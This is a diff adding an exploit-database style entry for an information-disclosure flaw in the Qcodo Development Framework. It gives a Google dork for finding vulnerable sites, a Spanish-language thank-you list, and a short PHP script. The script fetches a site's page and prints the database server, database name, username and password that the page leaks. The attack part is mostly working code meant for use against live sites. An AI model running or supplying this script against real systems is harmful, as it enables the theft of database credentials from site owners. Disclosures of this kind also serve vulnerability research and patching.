@@ -1,0 +1,35 @@
+# Exploit Title: Qcodo Development Framework 0.3.3 Full Info
+Disclosure
+# Google Dork: allintext: /qcodo/_devtools/codegen.php 
+# Date: 5/02/2011
+# Author: Daniel Godoy
+# Author Mail: DanielGodoy[at]GobiernoFederal[dot]com
+# Author Web: www.delincuentedigital.com.ar
+# Software Link: http://www.qcodo.com/
+# Version: All
+# Tested on: Linux
+
+[Comment]
+Agradezco a mis amigos: Hernan Jais, Alfonso Cuevas, Lisandro
+Lezaeta, Nicolas Montanaro, Luciano Laporta Podazza,Oscar
+Guerrero,Lucas Chavez,Inyexion, Login-Root, KikoArg, Ricota,
+Xarnuz, Truenex, TsunamiBoom, _tty0, Big, Sunplace, Killerboy,Erick
+Jordan,Animacco,
+yojota, Pablin77, SPEED, Knet, Cereal, Yago, Rash, MagnoBalt, El
+Rodrix, l0ve, her0
+ 
+
+[Qcodo Exploit]
+
+<?php
+$sitio = 'http://locahost/qcodo/';
+$source = file_get_contents($sitio);
+$explodeo = explode("array",$source);
+$explodeo2= explode("'",$explodeo[1]);
+echo "server: $explodeo2[7]";
+echo "<br>database: $explodeo2[13]";
+echo "<br>username: $explodeo2[17]";
+echo "<br>password: $explodeo2[21]";
+
+?>
+
